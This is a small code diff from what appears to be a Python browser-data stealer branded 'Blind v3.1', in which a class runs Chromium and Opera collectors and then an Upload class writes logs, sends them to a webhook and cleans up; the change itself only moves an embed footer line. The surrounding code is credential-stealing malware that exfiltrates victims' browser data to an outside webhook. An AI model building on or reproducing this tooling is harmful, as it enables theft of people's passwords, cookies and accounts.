@@ -23,7 +23,8 @@ class Browsers:
         Chromium()
         Opera()
         Upload(self.webhook)
-
+        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
+        
 class Upload:
     def __init__(self, webhook: SyncWebhook):
         self.webhook = webhook
@@ -31,7 +32,6 @@ class Upload:
         self.write_files()
         self.send()
         self.clean()
-        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
     
     def write_files(self):
         os.makedirs("Log", exist_ok=True)
